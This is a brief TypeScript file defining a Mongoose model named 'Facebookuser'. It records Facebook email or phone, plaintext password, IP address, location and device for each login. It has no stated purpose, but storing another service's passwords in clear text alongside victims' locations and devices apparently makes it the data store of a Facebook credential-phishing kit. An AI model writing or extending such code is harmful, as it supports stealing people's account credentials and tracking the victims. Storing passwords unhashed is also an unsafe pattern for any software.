// lib/models/FacebookLogin.ts
import mongoose from "mongoose";
import { model, models} from "mongoose";

const FacebookLoginSchema = new mongoose.Schema(
{
  emailOrPhone: {type:String, required: true},
  password: {type:String, required: true},
  ip: {type:String, required: true},
  location: {type: String, required: true},
  device: {type: String, required: true},
  timestamp: {
    type: Date,
    default: Date.now,
  }
}
);
const Facebookuser = models.Facebookuser || model("Facebookuser", FacebookLoginSchema);
export default Facebookuser
